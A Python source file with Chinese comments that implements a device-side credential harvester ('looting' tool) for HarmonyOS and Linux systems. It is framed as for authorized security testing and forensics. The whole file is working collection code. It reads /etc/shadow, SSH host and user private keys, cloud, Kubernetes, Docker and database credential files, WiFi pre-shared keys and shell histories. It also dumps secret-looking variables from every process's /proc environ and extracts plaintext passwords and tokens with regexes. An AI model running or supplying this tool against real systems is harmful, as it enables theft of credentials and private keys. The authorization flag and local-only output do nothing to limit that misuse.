#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sensitive_collector.py — HarmonyOS 设备敏感信息 / 凭据收集器(device-side)

在设备 shell(hishell / hdc shell / 本地终端)中运行, 参照 Linux 取证 checklist
全面收集设备范围内的敏感信息与凭据, 用于授权安全测试的信息收集(looting)与取证。

  收集类别(三层互补, 不依赖单一机制):
    1. 显式已知高价值路径(KNOWN_SYSTEM_GLOBS + HOME_CRED_RELS)—— 逐个检查存在性,
       覆盖 /etc/shadow、/etc/ssh/ssh_host_*_key、~/.ssh/id_*、~/.aws/credentials、
       ~/.kube/config、~/.pgpass、~/.bash_history、wpa_supplicant 等固定敏感位置,
       不靠 walk 撞运气。
    2. 目录遍历(walk DEFAULT_ROOTS)—— 兜底发现: 按扩展名/文件名匹配 + 【内容】
       私钥检测(任意命名的 PEM 私钥都能抓)+ 配置文件敏感字段提取。
    3. 运行时 —— /proc/<pid>/environ 进程环境变量(常含 TOKEN/PASSWORD);
       历史命令(*_history)中的明文凭据(命令行 -pPASS / URL 嵌入 user:pass)。

  凭据处理: 提取【明文】存储的凭据; 【加密】的(HUKS / 系统凭据)只标注路径。
  自适应: root 全扫; 非 root 限定可读路径并报告权限边界。
  约束: 强授权门控; 只读; 结果仅写本地文件, 不外发; 路径白名单 + 深度/大小限制。

用法:
    python3 sensitive_collector.py --i-am-authorized
    python3 sensitive_collector.py --i-am-authorized --root /data/app/el2
    python3 sensitive_collector.py --i-am-authorized --out /data/local/tmp/recon
    python3 sensitive_collector.py --i-am-authorized --json

仅用于已获书面授权的安全测试 / 取证。
"""
import os
import re
import sys
import json
import glob
import socket
import argparse
import subprocess

VERSION = "0.2"

# 扫描根白名单(walk 兜底遍历用; 显式高价值路径由 KNOWN/HOME 清单单独覆盖)
DEFAULT_ROOTS = [
    # —— Linux 用户家目录(PC 版核心: 私钥 / .config / .git-credentials 常在此)——
    "/storage/Users",         # PC 版用户家目录树(/storage/Users/<user>/.ssh 等)
    "/home", "/root",         # 标准 Linux home 兜底
    # —— OpenHarmony 应用 / 服务数据 ——
    "/data/storage/el2",      # 应用数据 + auth_groups
    "/data/storage/el1", "/data/storage/el4",
    "/data/storage",          # 兜底(其他 el 层)
    "/data/certificates",     # 证书目录
    "/data/local", "/data/global",
    # —— 系统凭据 ——
    "/etc",                   # passwd / shadow / ssl/private / ssh / sudoers 等(root)
    "/data/log",              # 日志
    "/var/log",               # 系统日志(auth.log 等常泄露凭据)
    # —— 临时区(常有人丢弃明文凭据)——
    "/opt", "/srv", "/tmp", "/var/tmp", "/dev/shm",
]

# 家目录候选根(枚举其下每个用户, 展开 HOME_CRED_RELS)
HOME_BASES = ["/storage/Users", "/home", "/root"]

# 限制
MAXDEPTH = 6                    # 覆盖 el2/<uid>/<bundle>/base/databases/*.db 等深沙箱路径
MAXFILE_BYTES = 512 * 1024     # 超过则不读内容(避免读巨型文件)
READ_SLICE = 64 * 1024         # 内容扫描只读前 64KB

# ---- 系统级高价值固定路径(Linux 取证 checklist; glob 展开, 自适应发行版)----
# 逐个检查存在性, 不依赖 walk。HarmonyOS PC 不一定全有, 不存在的自动跳过。
KNOWN_SYSTEM_GLOBS = [
    # 系统账号
    "/etc/passwd", "/etc/shadow", "/etc/gshadow", "/etc/group",
    "/etc/security/opasswd",
    # SSH host 私钥(所有类型) + 服务端配置
    "/etc/ssh/ssh_host_*_key",
    "/etc/ssh/sshd_config", "/etc/ssh/ssh_config",
    # sudo / 权限提升
    "/etc/sudoers", "/etc/sudoers.d/*",
    # 计划任务(常嵌明文凭据)
    "/etc/crontab", "/etc/anacrontab",
    "/etc/cron.d/*", "/etc/cron.daily/*", "/etc/cron.hourly/*",
    "/var/spool/cron/*", "/var/spool/cron/crontabs/*",
    # 网络 / VPN / WiFi(明文 PSK / 预共享密钥)
    "/etc/wpa_supplicant.conf", "/etc/wpa_supplicant/*.conf",
    "/etc/NetworkManager/system-connections/*",
    "/etc/ipsec.secrets", "/etc/ipsec.conf",
    "/etc/openvpn/*.conf", "/etc/openvpn/*.ovpn", "/etc/openvpn/*.txt",
    "/etc/ppp/chap-secrets", "/etc/ppp/pap-secrets",
    "/etc/resolv.conf", "/etc/hosts",
    # 数据库配置(连接凭据)
    "/etc/my.cnf", "/etc/mysql/my.cnf", "/etc/mysql/debian.cnf",
    "/etc/postgresql/*/*/pg_hba.conf", "/etc/postgresql/*/*/postgresql.conf",
    "/etc/redis/redis.conf", "/etc/mongod.conf",
    # Kerberos
    "/etc/krb5.keytab", "/etc/krb5.conf",
    # SSL / PKI 私钥(CA / 服务端私钥)
    "/etc/ssl/private/*", "/etc/pki/tls/private/*",
    "/etc/pki/CA/private/*", "/etc/pki/nssdb/*",
    # SNMP / RADIUS / 邮件(community / 共享密钥)
    "/etc/snmp/snmpd.conf",
    "/etc/raddb/clients.conf", "/etc/freeradius/clients.conf",
    # 挂载(fstab 可能含 CIFS/NFS 明文密码)
    "/etc/fstab",
    # 系统环境(可能写死凭据)
    "/etc/environment", "/etc/default/*",
]

# ---- 家目录凭据相对路径(对每个用户展开; 覆盖各类 id_* 私钥 + 云/DB/构建凭据 + 历史)----
HOME_CRED_RELS = [
    # SSH 私钥(所有类型)+ 元信息; .ssh/* 通配整个目录, 任意命名的私钥靠内容(PEM)识别
    ".ssh/id_rsa", ".ssh/id_dsa", ".ssh/id_ecdsa", ".ssh/id_ed25519",
    ".ssh/id_xmss", ".ssh/identity",
    ".ssh/*",
    ".ssh/authorized_keys", ".ssh/known_hosts", ".ssh/config",
    # GPG 私钥环
    ".gnupg/secring.gpg", ".gnupg/private-keys-v1.d/*",
    # Git / 包管理器凭据
    ".git-credentials", ".config/git/credentials", ".gitconfig",
    ".netrc", ".npmrc", ".pypirc", ".gem/credentials",
    # 云 / 容器 / K8s
    ".aws/credentials", ".aws/config",
    ".kube/config",
    ".docker/config.json", ".dockercfg",
    ".config/gcloud/credentials.db", ".config/gcloud/legacy_credentials/*",
    ".azure/accessTokens.json", ".azure/service_principal.json",
    # 数据库客户端(明文连接凭据)
    ".my.cnf", ".pgpass", ".pg_service.conf", ".msmtprc", ".esmtprc",
    # 构建 / IaC(常含 Nexus / registry / 云密码)
    ".m2/settings.xml", ".gradle/gradle.properties",
    "*.tfvars", ".terraform.d/credentials.tfrc.json",
    ".vault-token", ".config/rclone/rclone.conf",
    # shell 配置(常 export TOKEN/PASSWORD)
    ".env", ".env.local", ".bashrc", ".bash_profile", ".bash_login",
    ".profile", ".zshrc", ".zprofile", ".bash_aliases",
    # 历史命令(明文密码金矿: mysql -pPASS / curl -u / URL 嵌入)
    ".bash_history", ".zsh_history", ".sh_history",
    ".python_history", ".mysql_history", ".psql_history",
    ".rediscli_history", ".lesshst", ".wgetrc", ".curlrc",
]

# 凭据特征文件(walk 兜底: 按扩展名 / 文件名)
CRED_EXTS = (".pem", ".crt", ".cer", ".p12", ".pfx", ".key", ".keystore",
             ".jks", ".kdbx", ".env", ".ovpn", ".rdp", ".p7b", ".der",
             ".tfvars", ".secret", ".creds")
CRED_NAMES = ("id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_xmss",
              "identity", "authorized_keys", "known_hosts",
              ".git-credentials", ".npmrc", ".pypirc", ".netrc",
              ".my.cnf", ".pgpass", ".msmtprc",
              "shadow", "gshadow", "passwd", "wpasupplicant",
              "wpa_supplicant.conf", "sshd_config", "krb5.conf", "krb5.keytab",
              "snmpd.conf", "debian.cnf", "settings.xml", "gradle.properties",
              ".vault-token", "fstab", "ipsec.secrets",
              "credentials.db", "accounts.db", "login.keyring",
              ".bash_history", ".zsh_history", ".mysql_history", ".psql_history")

# 密钥库 / 系统凭据路径(只标注存在性, 内容通常加密)
KEYSTORE_PATHS = [
    "/data/service/el1/public/huks",
    "/data/service/el1/public/device_auth",
    "/data/misc/keystore",
    "/data/system",
]

# 敏感字段正则(明文提取; key 引号可选以兼容 JSON / ini / env / shell export)
# 结构: (人类可读字段名, 编译正则)
SECRET_PATTERNS = [
    ("password/psk",
     re.compile(r"\"?(?:password|passwd|pwd|wpa_?psk|psk)\"?\s*[:=]\s*['\"]?([^\s'\"]{4,})", re.I)),
    ("secret",
     re.compile(r"\"?(?:secret|api_?secret|client_?secret)\"?\s*[:=]\s*['\"]?([^\s'\"]{4,})", re.I)),
    ("token",
     re.compile(r"\"?(?:token|access_?token|auth_?token|refresh_?token)\"?\s*[:=]\s*['\"]?([^\s'\"]{6,})", re.I)),
    ("api_key",
     re.compile(r"\"?(?:api_?key|access_?key|secret_?key|app_?key|appkey)\"?\s*[:=]\s*['\"]?([^\s'\"]{6,})", re.I)),
    ("private_key",
     re.compile(r"\"?(?:private_?key|priv)\"?\s*[:=]\s*['\"]?([A-Za-z0-9+/=_\-]{16,})", re.I)),
]

# 私钥内容检测(覆盖任意命名的私钥文件, 不依赖文件名 id_rsa 等)
PEM_KEY_RE = re.compile(
    r"-----BEGIN (?:RSA |DSA |EC |OPENSSH |ENCRYPTED |PGP )?PRIVATE KEY-----")

# 历史命令中的明文凭据(命令行参数 / URL 嵌入; 补充 SECRET_PATTERNS 的 key=value 模式)
HISTORY_PATTERNS = [
    re.compile(r"https?://[^/\s:@]+:(\S+?)@[^\s/]+"),             # URL 内嵌 user:pass
    # -pPASS / -p PASS / --password=PASS / --password PASS
    re.compile(r"(?:^|\s)-{1,2}p(?:ass(?:word)?)?(?:=|\s+)?(\S{4,})"),
    re.compile(r"(?:^|\s)-u\s+([^\s/]+:[^\s/]+)"),                # -u user:pass
]

# /proc/<pid>/environ 敏感环境变量键(精准匹配, 避免误报)
ENV_SENS_KEYS = ("password", "passwd", "pwd", "secret", "token",
                 "apikey", "api_key", "credential", "private_key",
                 "access_key", "secret_key", "client_secret")

SENS_LINE_KEYS = ("token", "password", "passwd", "secret", "credential",
                  "sessionkey", "auth", "apikey")


# ---------------------------------------------------------------------------
# 工具
# ---------------------------------------------------------------------------
def is_root():
    return hasattr(os, "geteuid") and os.geteuid() == 0


def _sh(cmd):
    """跑 shell 命令取 stdout(超时/异常返回空串)"""
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=10)
        return (p.stdout or "").strip()
    except Exception:
        return ""


def _get_ips():
    """非回环 IPv4 列表(hostname -I / ip addr / ifconfig 逐级回退)"""
    out = _sh("hostname -I 2>/dev/null")
    if out:
        ips = [x for x in out.split()
               if "." in x and not x.startswith("127.")]
        if ips:
            return ips
    for cmd in ("ip -o -4 addr show 2>/dev/null", "ifconfig 2>/dev/null"):
        o = _sh(cmd)
        ips = [m.group(1)
               for m in re.finditer(r"inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)", o)
               if not m.group(1).startswith("127.")]
        if ips:
            return ips
    return []


def _size(p):
    try:
        return os.path.getsize(p)
    except Exception:
        return -1


def _read_text(path, limit=READ_SLICE):
    """安全读取文本前 limit 字节; 二进制(含 NUL)/过大/无法解码返回 None"""
    try:
        if _size(path) > MAXFILE_BYTES:
            return None
        with open(path, "rb") as f:
            raw = f.read(limit)
        if b"\x00" in raw[:1024]:           # NUL 字节 -> 判定为二进制
            return None
        return raw.decode("utf-8", "replace")
    except Exception:
        return None


def is_private_key(text):
    """检测文本是否为 PEM 私钥(覆盖任意命名的私钥文件)"""
    return bool(text and PEM_KEY_RE.search(text[:512]))


def _extract_secrets(text, path, seen):
    """从文本提取 SECRET_PATTERNS 命中的明文; seen 跨收集器去重"""
    out = []
    if not text:
        return out
    for name, pat in SECRET_PATTERNS:
        for m in pat.finditer(text):
            val = m.group(1)
            sig = (path, val[:8])
            if sig not in seen:
                seen.add(sig)
                out.append({"file": path, "field": name, "value": val})
    return out


def walk_files(path, maxdepth=MAXDEPTH):
    if not os.path.isdir(path):
        return
    try:
        for dp, dn, fn in os.walk(path):
            rel = dp[len(path):].lstrip(os.sep)
            depth = 0 if rel == "" else rel.count(os.sep) + 1
            if depth > maxdepth:
                dn[:] = []
                continue
            for f in fn:
                yield os.path.join(dp, f)
    except OSError:
        return


def _home_dirs():
    """枚举所有用户家目录(/storage/Users/*, /home/*, /root)"""
    homes = []
    for base in HOME_BASES:
        if not os.path.isdir(base):
            continue
        if base == "/root":              # /root 自身就是家目录
            homes.append("/root")
            continue
        try:
            for u in os.listdir(base):
                ud = os.path.join(base, u)
                if os.path.isdir(ud):
                    homes.append(ud)
        except OSError:
            continue
    return homes


# ---------------------------------------------------------------------------
# 各类别收集器
# ---------------------------------------------------------------------------
def collect_device_id():
    """设备身份 / OS 版本(从常见系统文件; 不一定都存在)"""
    out = {}
    candidates = {
        "udid": ["/data/service/el2/100/udid.dat",
                 "/data/misc/udid"],
    }
    for key, paths in candidates.items():
        for p in paths:
            t = _read_text(p, 256)
            if t:
                out[key] = t.strip()
                break
    for p in ("/system/etc/param/", "/etc/param/"):
        if os.path.isdir(p):
            out["build_param_dir"] = p
    try:
        out["hostname"] = socket.gethostname()
    except Exception:
        pass
    ips = _get_ips()
    if ips:
        out["ips"] = ips
        out["ip"] = ips[0]
    else:
        out["ip"] = "127.0.0.1"
    return out


def collect_network():
    """网络配置(hosts / 接口 / 可读 wifi 配置)"""
    out = {}
    hosts = _read_text("/system/etc/hosts") or _read_text("/etc/hosts")
    if hosts:
        out["hosts"] = hosts.strip().splitlines()[:50]
    for p in ("/data/misc/wifi/wpa_supplicant.conf",
              "/data/misc/wifi/WifiConfigStore.xml"):
        t = _read_text(p)
        if t:
            out["wifi_config"] = p
            out["wifi_psk_hint"] = ("psk=" in t or "<PreSharedKey" in t)
    return out


def collect_keystore_presence(keystore_paths=None):
    """密钥库 / 系统凭据存在性(仅标注, 不读内容)"""
    paths = keystore_paths if keystore_paths is not None else KEYSTORE_PATHS
    found = []
    for p in paths:
        if os.path.exists(p):
            found.append({"path": p, "type": "dir" if os.path.isdir(p) else "file",
                          "note": "内容通常加密, 仅标注存在"})
    return found


def _collect_paths(paths, seen):
    """对一组已存在文件路径: 读内容, 标注私钥/敏感字段, 返回 (files, secrets)"""
    files, secrets = [], []
    done = set()           # glob 重叠(如 .ssh/* 与 .ssh/id_rsa)会重复, 去重
    for p in paths:
        if p in done or os.path.isdir(p):
            done.add(p)
            continue
        done.add(p)
        text = _read_text(p)
        pk = is_private_key(text)
        sec = _extract_secrets(text, p, seen)
        secrets.extend(sec)
        files.append({"file": p, "size": _size(p),
                      "private_key": pk, "has_inline_secret": bool(sec)})
    return files, secrets


def collect_credential_files(roots, seen=None):
    """walk 兜底: 凭据特征文件(扩展名/文件名) + 【内容】私钥检测 + 敏感字段提取"""
    if seen is None:
        seen = set()
    files, secrets = [], []
    for root in roots:
        for f in walk_files(root):
            base = os.path.basename(f)
            low = base.lower()
            text = _read_text(f)
            pk = is_private_key(text)
            is_cred = (low.endswith(CRED_EXTS) or low in CRED_NAMES)
            sec = _extract_secrets(text, f, seen)
            secrets.extend(sec)
            if is_cred or pk:           # 文件名命中 或 内容是私钥
                files.append({"file": f, "size": _size(f), "private_key": pk,
                              "has_inline_secret": bool(sec)})
    return {"files": files, "secrets": secrets}


def collect_known_system(seen=None):
    """显式检查系统级高价值固定路径(Linux 取证 checklist; glob 展开)"""
    if seen is None:
        seen = set()
    paths = []
    for pat in KNOWN_SYSTEM_GLOBS:
        try:
            paths.extend(glob.glob(pat))
        except Exception:
            pass
    files, secrets = _collect_paths(paths, seen)
    return {"files": files, "secrets": secrets}


def collect_home_creds(seen=None):
    """枚举每个用户家目录, 展开已知凭据相对路径(私钥/云/DB/构建凭据/历史)"""
    if seen is None:
        seen = set()
    paths = []
    for home in _home_dirs():
        for rel in HOME_CRED_RELS:
            full = os.path.join(home, rel)
            try:
                paths.extend(glob.glob(full))
            except Exception:
                pass
    files, secrets = _collect_paths(paths, seen)
    return {"files": files, "secrets": secrets}


def collect_proc_env():
    """/proc/<pid>/environ 中含敏感键的环境变量(进程内存里的明文凭据)"""
    hits = []
    try:
        pids = os.listdir("/proc")
    except OSError:
        return hits
    for pid in pids:
        if not pid.isdigit():
            continue
        envp = f"/proc/{pid}/environ"
        try:
            with open(envp, "rb") as f:
                raw = f.read(64 * 1024)
        except Exception:
            continue
        if not raw:
            continue
        text = raw.decode("utf-8", "replace")
        for kv in text.split("\x00"):       # environ 以 NUL 分隔
            if "=" not in kv:
                continue
            k, _, v = kv.partition("=")
            kl = k.lower()
            if not any(s in kl for s in ENV_SENS_KEYS):
                continue
            if len(v) < 3 or v.lower() in ("x", "true", "false", "none"):
                continue
            hits.append({"pid": pid, "env": k, "value": v[:64]})
            if len(hits) >= 200:
                return hits
    return hits


def collect_history_secrets(roots):
    """历史命令文件(*_history)中的明文凭据(URL 嵌入 / -pPASS / -u user:pass)"""
    hits = []
    for root in roots:
        for f in walk_files(root):
            low = os.path.basename(f).lower()
            if "history" not in low and not low.endswith((".lesshst",)):
                continue
            text = _read_text(f)
            if not text:
                continue
            for line in text.splitlines():
                for pat in HISTORY_PATTERNS:
                    if pat.search(line):
                        hits.append({"file": f, "line": line.strip()[:200]})
                        break
                if len(hits) >= 200:
                    return hits
    return hits


def collect_log_secrets(roots):
    """日志文件中的敏感行(限大小)"""
    hits = []
    for root in roots:
        for f in walk_files(root):
            if not f.lower().endswith((".log", ".hilog")):
                continue
            text = _read_text(f)
            if not text:
                continue
            for line in text.splitlines():
                ll = line.lower()
                if any(k in ll for k in SENS_LINE_KEYS):
                    hits.append({"file": f, "line": line.strip()[:200]})
                    if len(hits) >= 200:
                        return hits
    return hits


def collect_all(roots):
    seen = set()
    creds = collect_credential_files(roots, seen)
    known = collect_known_system(seen)
    home = collect_home_creds(seen)
    all_secrets = creds["secrets"] + known["secrets"] + home["secrets"]
    return {
        "version": VERSION,
        "is_root": is_root(),
        "roots_scanned": roots,
        "device": collect_device_id(),
        "network": collect_network(),
        "keystores": collect_keystore_presence(),
        "walk_credentials": creds["files"],
        "system_credentials": known["files"],
        "home_credentials": home["files"],
        "inline_secrets": all_secrets,
        "proc_env": collect_proc_env(),
        "history_secrets": collect_history_secrets(roots),
        "log_secrets": collect_log_secrets(roots),
    }


# ---------------------------------------------------------------------------
# 渲染
# ---------------------------------------------------------------------------
def _cred_block(title, files):
    L = [f"\n[+] {title}({len(files)})"]
    for c in files[:60]:
        flag = []
        if c.get("private_key"):
            flag.append("私钥")
        if c.get("has_inline_secret"):
            flag.append("⚠含明文")
        tag = f" [{'/'.join(flag)}]" if flag else ""
        L.append(f"    {c['file']} ({c['size']}B){tag}")
    if len(files) > 60:
        L.append(f"    … 还有 {len(files) - 60} 个")
    return L


def render_text(r):
    L = [f"[+] HarmonyOS 敏感信息收集 v{VERSION}",
         f"[+] 权限: {'root(可全扫)' if r['is_root'] else '非root(范围受限, 见边界)'}",
         f"[+] 扫描根: {' '.join(r['roots_scanned'])}"]
    # 设备
    L.append("\n[+] 设备身份 / 网络")
    for k, v in r["device"].items():
        L.append(f"    {k}: {v}")
    for k, v in r["network"].items():
        L.append(f"    net.{k}: {v}")
    # 三类凭据文件
    L.extend(_cred_block("① 系统级敏感文件(/etc 固定路径)", r["system_credentials"]))
    L.extend(_cred_block("② 家目录凭据(私钥/云/DB/构建/历史)", r["home_credentials"]))
    L.extend(_cred_block("③ walk 发现的凭据文件", r["walk_credentials"]))
    # 明文 secrets
    sec = r["inline_secrets"]
    L.append(f"\n[!] 提取到的明文凭据/密钥({len(sec)})")
    for s in sec[:60]:
        L.append(f"    {s['file']}")
        L.append(f"        {s['value'][:6]}… ({len(s['value'])}字符)  <- {s['field'][:24]}")
    if len(sec) > 60:
        L.append(f"    … 还有 {len(sec) - 60} 条")
    # 进程环境
    env = r["proc_env"]
    L.append(f"\n[!] 进程环境中的敏感变量({len(env)})")
    for h in env[:30]:
        L.append(f"    pid={h['pid']}  {h['env']}={h['value'][:6]}…")
    # 历史命令
    hs = r["history_secrets"]
    L.append(f"\n[!] 历史命令中的明文凭据({len(hs)})")
    for h in hs[:20]:
        L.append(f"    [{h['file']}] {h['line']}")
    # 日志敏感
    lg = r["log_secrets"]
    L.append(f"\n[+] 日志中的敏感行({len(lg)})")
    for h in lg[:20]:
        L.append(f"    [{h['file']}] {h['line']}")
    # 密钥库
    ks = r["keystores"]
    L.append(f"\n[+] 密钥库 / 系统凭据(存在性, {len(ks)})")
    for k in ks:
        L.append(f"    {k['path']} [{k['type']}] {k['note']}")
    L.append("\n说明: 明文凭据完整值见 JSON; 加密项(HUKS/系统凭据)无法解密, 仅标注。")
    L.append("      三层覆盖: ①系统固定路径 ②家目录展开 ③walk 兜底 + /proc/environ + 历史。")
    L.append("      完整数据可用 --json 输出 / --out 写文件。")
    return "\n".join(L)


def main():
    ap = argparse.ArgumentParser(
        description="HarmonyOS 设备敏感信息/凭据收集器(device-side, 需授权)")
    ap.add_argument("--i-am-authorized", action="store_true",
                    help="确认你对本设备拥有书面测试/取证授权(必须)")
    ap.add_argument("--root", action="append", default=[],
                    help="覆盖扫描根(可多次指定; 默认设备典型敏感路径)")
    ap.add_argument("--out", help="输出目录(写入 report.json + report.txt)")
    ap.add_argument("--json", action="store_true", help="stdout 输出 JSON")
    args = ap.parse_args()

    if not args.i_am_authorized:
        sys.stderr.write(
            "拒绝运行: 未确认授权。\n本工具收集设备敏感信息与凭据, 仅用于已获书面"
            "授权的安全测试 / 取证, 结果仅写本地不外发。\n加 --i-am-authorized 确认授权。\n")
        sys.exit(2)

    roots = args.root if args.root else DEFAULT_ROOTS
    report = collect_all(roots)

    if args.json:
        print(json.dumps(report, ensure_ascii=False, indent=2))
    else:
        print(render_text(report))

    if args.out:
        try:
            os.makedirs(args.out, exist_ok=True)
            with open(os.path.join(args.out, "report.json"), "w") as f:
                json.dump(report, f, ensure_ascii=False, indent=2)
            with open(os.path.join(args.out, "report.txt"), "w") as f:
                f.write(render_text(report))
            sys.stderr.write(f"[+] 报告已写入 {args.out}/report.{{json,txt}}\n")
        except OSError as e:
            sys.stderr.write(f"[x] 写报告失败: {e}\n")


if __name__ == "__main__":
    main()
